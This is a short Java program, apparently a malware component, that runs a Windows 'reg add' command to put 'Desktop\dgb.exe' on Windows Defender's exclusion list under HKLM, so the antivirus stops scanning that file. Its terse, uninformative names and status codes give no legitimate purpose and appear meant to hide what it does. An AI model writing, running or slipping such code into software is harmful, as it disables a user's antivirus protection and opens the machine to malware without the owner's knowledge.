import java.io.IOException;

public class ark {

    public static void main(String[] args) {
        try {

            String rkp = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";

            String ep = "Desktop\\dgb.exe";

            arkService(rkp, ep);

            System.out.println("1");
        } catch (IOException | InterruptedException e) {
            System.err.println("0x15" + e.getMessage());
        }
    }

    private static void arkService(String rkp, String ep)
            throws IOException, InterruptedException {

        String command = "reg add \"" + rkp + "\" /v \"" + ep + "\" /t REG_DWORD /d 0 /f";
        System.out.println(command);

        Process process = Runtime.getRuntime().exec(command);
        process.waitFor();
    }
}